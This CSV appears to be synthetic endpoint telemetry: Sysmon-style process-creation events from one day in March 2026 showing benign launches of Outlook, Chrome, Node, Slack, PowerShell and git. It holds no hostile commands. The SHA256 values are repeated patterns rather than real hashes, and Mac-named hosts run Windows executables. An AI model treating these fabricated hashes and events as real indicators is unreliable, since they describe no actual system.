UtcTime,Computer,User,EventID,Image,CommandLine,ParentImage,DestinationIp,DestinationPort,Hashes
2026-03-09 08:31:32.271,MAC-DEV-04,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0011fac7f7c54f0f0011fac7f7c54f0f0011fac7f7c54f0f0011fac7f7c54f0f
2026-03-09 08:45:49.097,FIN-WS31,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00079e03f172b93a00079e03f172b93a00079e03f172b93a00079e03f172b93a
2026-03-09 08:50:37.490,FIN-WS22,t.owens,1,node,"node",explorer.exe,,,SHA256=0003593222ee19450003593222ee19450003593222ee19450003593222ee1945
2026-03-09 08:55:50.380,FIN-WS31,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000bf759fe006c13000bf759fe006c13000bf759fe006c13000bf759fe006c13
2026-03-09 09:10:40.882,FIN-WS31,l.chen,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00057dfeb86a7f2000057dfeb86a7f2000057dfeb86a7f2000057dfeb86a7f20
2026-03-09 09:19:14.184,BLD-RUN-02,e.park,1,git,"git",explorer.exe,,,SHA256=000ed248d9dbfd24000ed248d9dbfd24000ed248d9dbfd24000ed248d9dbfd24
2026-03-09 09:31:24.359,MAC-DEV-17,m.sato,1,git,"git",explorer.exe,,,SHA256=000c1069288fc48d000c1069288fc48d000c1069288fc48d000c1069288fc48d
2026-03-09 09:37:17.709,BLD-RUN-02,a.velasquez,1,git,"git",explorer.exe,,,SHA256=0013151f149188310013151f149188310013151f149188310013151f14918831
2026-03-09 09:50:36.159,FIN-WS22,a.velasquez,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001a644d13e10baf001a644d13e10baf001a644d13e10baf001a644d13e10baf
2026-03-09 10:00:03.524,MAC-DEV-17,e.park,1,git,"git",explorer.exe,,,SHA256=001d9923655a5eed001d9923655a5eed001d9923655a5eed001d9923655a5eed
2026-03-09 10:06:05.264,MAC-DEV-17,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001be73e38afdfe3001be73e38afdfe3001be73e38afdfe3001be73e38afdfe3
2026-03-09 10:12:31.829,FIN-WS31,e.park,1,git,"git",explorer.exe,,,SHA256=001ce6b12d0c3677001ce6b12d0c3677001ce6b12d0c3677001ce6b12d0c3677
2026-03-09 10:23:31.291,FIN-WS22,m.sato,1,git,"git",explorer.exe,,,SHA256=000c1979d94721cc000c1979d94721cc000c1979d94721cc000c1979d94721cc
2026-03-09 10:30:22.357,FIN-WS31,a.velasquez,1,git,"git",explorer.exe,,,SHA256=00214477687d946800214477687d946800214477687d946800214477687d9468
2026-03-09 10:42:35.795,FIN-WS31,l.chen,1,node,"node",explorer.exe,,,SHA256=00012be22620f18300012be22620f18300012be22620f18300012be22620f183
2026-03-09 10:55:35.606,FIN-WS31,n.byrd,1,node,"node",explorer.exe,,,SHA256=00163471285fde9300163471285fde9300163471285fde9300163471285fde93
2026-03-09 11:06:50.711,FIN-WS22,t.owens,1,node,"node",explorer.exe,,,SHA256=000cfbf91418dc95000cfbf91418dc95000cfbf91418dc95000cfbf91418dc95
2026-03-09 11:21:49.479,FIN-WS31,r.kapoor,1,node,"node",explorer.exe,,,SHA256=001d875c634d8fdf001d875c634d8fdf001d875c634d8fdf001d875c634d8fdf
2026-03-09 11:33:13.611,MAC-DEV-04,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0008a90b5d4def880008a90b5d4def880008a90b5d4def880008a90b5d4def88
2026-03-09 11:46:26.126,FIN-WS22,l.chen,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000cac8514fdddef000cac8514fdddef000cac8514fdddef000cac8514fdddef
2026-03-09 11:58:41.373,FIN-WS31,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0016c48c01fe66e90016c48c01fe66e90016c48c01fe66e90016c48c01fe66e9
2026-03-09 12:04:43.612,FIN-WS22,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0007bd4d424f5e6e0007bd4d424f5e6e0007bd4d424f5e6e0007bd4d424f5e6e
2026-03-09 12:08:37.529,FIN-WS22,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0004dd762b102a3f0004dd762b102a3f0004dd762b102a3f0004dd762b102a3f
2026-03-09 12:14:06.718,MAC-DEV-17,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0018e459307248370018e459307248370018e459307248370018e45930724837
2026-03-09 12:27:37.683,MAC-DEV-17,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00219cdcb6bd0b5800219cdcb6bd0b5800219cdcb6bd0b5800219cdcb6bd0b58
2026-03-09 12:38:19.421,FIN-WS22,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0007f39e062193b00007f39e062193b00007f39e062193b00007f39e062193b0
2026-03-09 12:49:45.709,FIN-WS31,a.velasquez,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000ce23ee71586bc000ce23ee71586bc000ce23ee71586bc000ce23ee71586bc
2026-03-09 12:58:37.220,MAC-DEV-17,n.byrd,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0000155f4028cf1b0000155f4028cf1b0000155f4028cf1b0000155f4028cf1b
2026-03-09 13:09:44.766,BLD-RUN-02,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000dced70d2d865c000dced70d2d865c000dced70d2d865c000dced70d2d865c
2026-03-09 13:14:29.158,MAC-DEV-17,m.sato,1,git,"git",explorer.exe,,,SHA256=0015cf38d547c6a00015cf38d547c6a00015cf38d547c6a00015cf38d547c6a0
2026-03-09 13:26:35.181,FIN-WS22,m.sato,1,node,"node",explorer.exe,,,SHA256=000743df79c4fdac000743df79c4fdac000743df79c4fdac000743df79c4fdac
2026-03-09 13:36:45.964,MAC-DEV-17,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00079cf7ee7f755800079cf7ee7f755800079cf7ee7f755800079cf7ee7f7558
2026-03-09 13:46:19.769,MAC-DEV-04,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0006397f3c982ecc0006397f3c982ecc0006397f3c982ecc0006397f3c982ecc
2026-03-09 13:54:20.835,FIN-WS22,l.chen,1,node,"node",explorer.exe,,,SHA256=0005329523fbe3b70005329523fbe3b70005329523fbe3b70005329523fbe3b7
2026-03-09 14:06:19.842,FIN-WS31,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001ced6e08a3926d001ced6e08a3926d001ced6e08a3926d001ced6e08a3926d
2026-03-09 14:18:41.888,FIN-WS31,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000c4ae07d18f0f4000c4ae07d18f0f4000c4ae07d18f0f4000c4ae07d18f0f4
2026-03-09 14:27:45.870,FIN-WS31,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0015b18e7978c88f0015b18e7978c88f0015b18e7978c88f0015b18e7978c88f
2026-03-09 14:36:38.882,FIN-WS31,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00033204bbc4585c00033204bbc4585c00033204bbc4585c00033204bbc4585c
2026-03-09 14:40:39.148,MAC-DEV-17,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000f570e178e365a000f570e178e365a000f570e178e365a000f570e178e365a
2026-03-09 14:55:00.216,MAC-DEV-17,t.owens,1,node,"node",explorer.exe,,,SHA256=00139ce6ee7ce0c800139ce6ee7ce0c800139ce6ee7ce0c800139ce6ee7ce0c8
2026-03-09 15:09:28.692,MAC-DEV-17,n.byrd,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000e4bf4106d158f000e4bf4106d158f000e4bf4106d158f000e4bf4106d158f
2026-03-09 15:23:48.225,FIN-WS22,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0005f9c43b335b7d0005f9c43b335b7d0005f9c43b335b7d0005f9c43b335b7d
2026-03-09 15:35:04.679,FIN-WS22,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000a6f8270ee4c6a000a6f8270ee4c6a000a6f8270ee4c6a000a6f8270ee4c6a
2026-03-09 15:43:30.168,MAC-DEV-17,r.kapoor,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0008d281eedc39420008d281eedc39420008d281eedc39420008d281eedc3942
2026-03-09 15:49:59.812,FIN-WS31,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00154867677b78f000154867677b78f000154867677b78f000154867677b78f0
2026-03-09 16:02:57.718,MAC-DEV-04,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000fd1b3bc3bd778000fd1b3bc3bd778000fd1b3bc3bd778000fd1b3bc3bd778
2026-03-09 16:10:26.755,FIN-WS22,n.byrd,1,git,"git",explorer.exe,,,SHA256=000684a94cd6c0fa000684a94cd6c0fa000684a94cd6c0fa000684a94cd6c0fa
2026-03-09 16:22:08.100,FIN-WS31,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001fe038291b8c6a001fe038291b8c6a001fe038291b8c6a001fe038291b8c6a
2026-03-09 16:33:27.038,FIN-WS22,a.velasquez,1,git,"git",explorer.exe,,,SHA256=001a4bbf61804081001a4bbf61804081001a4bbf61804081001a4bbf61804081
2026-03-09 16:46:33.862,MAC-DEV-17,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0020b38350e2b93e0020b38350e2b93e0020b38350e2b93e0020b38350e2b93e
2026-03-09 17:00:18.301,MAC-DEV-17,n.byrd,1,git,"git",explorer.exe,,,SHA256=001d5865618de9e9001d5865618de9e9001d5865618de9e9001d5865618de9e9
2026-03-09 17:07:34.541,FIN-WS31,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000c85c4d71d1124000c85c4d71d1124000c85c4d71d1124000c85c4d71d1124
2026-03-09 17:19:06.158,FIN-WS22,e.park,1,git,"git",explorer.exe,,,SHA256=0001a92d255968700001a92d255968700001a92d255968700001a92d25596870
2026-03-09 17:28:10.766,BLD-RUN-02,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001e0f53ff8da8b9001e0f53ff8da8b9001e0f53ff8da8b9001e0f53ff8da8b9
2026-03-09 17:42:28.151,FIN-WS31,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0014a0ca0b5aa2e40014a0ca0b5aa2e40014a0ca0b5aa2e40014a0ca0b5aa2e4
2026-03-09 17:52:28.554,FIN-WS22,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00201ec93f978db600201ec93f978db600201ec93f978db600201ec93f978db6
2026-03-09 18:00:43.841,BLD-RUN-02,t.owens,1,node,"node",explorer.exe,,,SHA256=0019ec0dea48ed430019ec0dea48ed430019ec0dea48ed430019ec0dea48ed43
2026-03-09 18:08:37.268,FIN-WS22,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00013c8a84206e6b00013c8a84206e6b00013c8a84206e6b00013c8a84206e6b
2026-03-09 18:17:10.966,MAC-DEV-17,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0004c8bcaef55a020004c8bcaef55a020004c8bcaef55a020004c8bcaef55a02
2026-03-09 18:23:27.856,MAC-DEV-17,m.sato,1,node,"node",explorer.exe,,,SHA256=000eb7664cc2898c000eb7664cc2898c000eb7664cc2898c000eb7664cc2898c
2026-03-09 18:30:56.372,MAC-DEV-17,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001a704ba96c0005001a704ba96c0005001a704ba96c0005001a704ba96c0005
2026-03-09 18:42:37.160,FIN-WS31,l.chen,1,git,"git",explorer.exe,,,SHA256=0017da83f8068a5a0017da83f8068a5a0017da83f8068a5a0017da83f8068a5a
2026-03-09 18:46:35.963,MAC-DEV-17,r.kapoor,1,node,"node",explorer.exe,,,SHA256=00055e836d11009200055e836d11009200055e836d11009200055e836d110092
2026-03-09 18:59:18.135,MAC-DEV-17,n.byrd,1,git,"git",explorer.exe,,,SHA256=00068c71f3506a3900068c71f3506a3900068c71f3506a3900068c71f3506a39
2026-03-09 19:05:43.921,MAC-DEV-17,m.sato,1,node,"node",explorer.exe,,,SHA256=00143a0b56fab0bf00143a0b56fab0bf00143a0b56fab0bf00143a0b56fab0bf
2026-03-09 19:15:33.463,FIN-WS22,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000e0f05a12ec02a000e0f05a12ec02a000e0f05a12ec02a000e0f05a12ec02a
2026-03-09 19:24:31.641,BLD-RUN-02,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00029f3de3b7143100029f3de3b7143100029f3de3b7143100029f3de3b71431
2026-03-09 19:33:50.012,FIN-WS31,e.park,1,node,"node",explorer.exe,,,SHA256=000fcb0f3ca05fc0000fcb0f3ca05fc0000fcb0f3ca05fc0000fcb0f3ca05fc0
2026-03-09 19:44:55.026,MAC-DEV-17,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001dd1aeedc3e329001dd1aeedc3e329001dd1aeedc3e329001dd1aeedc3e329
2026-03-09 19:59:02.680,BLD-RUN-02,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0017d73e2bcf9c8b0017d73e2bcf9c8b0017d73e2bcf9c8b0017d73e2bcf9c8b
2026-03-09 20:03:38.690,FIN-WS22,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00134652b79c342200134652b79c342200134652b79c342200134652b79c3422
2026-03-09 20:13:37.069,FIN-WS31,t.owens,1,node,"node",explorer.exe,,,SHA256=001584bc77b04413001584bc77b04413001584bc77b04413001584bc77b04413
2026-03-09 20:24:10.971,BLD-RUN-02,l.chen,1,node,"node",explorer.exe,,,SHA256=0020302e9b2aa1a00020302e9b2aa1a00020302e9b2aa1a00020302e9b2aa1a0
2026-03-09 20:29:19.958,BLD-RUN-02,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00190ac79c0637d500190ac79c0637d500190ac79c0637d500190ac79c0637d5
2026-03-09 20:37:38.269,FIN-WS31,e.park,1,node,"node",explorer.exe,,,SHA256=0004563bfe76f6d90004563bfe76f6d90004563bfe76f6d90004563bfe76f6d9
2026-03-09 20:45:23.388,FIN-WS22,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00179cc48571d1db00179cc48571d1db00179cc48571d1db00179cc48571d1db
2026-03-09 20:50:54.763,MAC-DEV-17,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001771f577d22259001771f577d22259001771f577d22259001771f577d22259
2026-03-09 20:59:51.123,MAC-DEV-04,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000f82070345b9ef000f82070345b9ef000f82070345b9ef000f82070345b9ef
2026-03-09 21:09:57.849,MAC-DEV-17,t.owens,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000a91a149a9f3d7000a91a149a9f3d7000a91a149a9f3d7000a91a149a9f3d7
2026-03-09 21:13:44.054,MAC-DEV-17,e.park,1,git,"git",explorer.exe,,,SHA256=000e55bcd116d678000e55bcd116d678000e55bcd116d678000e55bcd116d678
2026-03-09 21:24:04.385,MAC-DEV-17,r.kapoor,1,git,"git",explorer.exe,,,SHA256=0006b097570e12d50006b097570e12d50006b097570e12d50006b097570e12d5
2026-03-09 21:34:22.491,MAC-DEV-17,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000cb8ebea5a6376000cb8ebea5a6376000cb8ebea5a6376000cb8ebea5a6376
2026-03-09 21:43:11.793,BLD-RUN-02,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00215f1cb46235bc00215f1cb46235bc00215f1cb46235bc00215f1cb46235bc
2026-03-09 21:50:37.020,FIN-WS22,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0009b8172f1f43490009b8172f1f43490009b8172f1f43490009b8172f1f4349
2026-03-09 22:02:45.006,BLD-RUN-02,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00037d055124fd9600037d055124fd9600037d055124fd9600037d055124fd96
2026-03-09 22:14:34.421,FIN-WS31,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00068a101941201d00068a101941201d00068a101941201d00068a101941201d
2026-03-09 22:21:08.880,MAC-DEV-04,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00189212ec5b889900189212ec5b889900189212ec5b889900189212ec5b8899
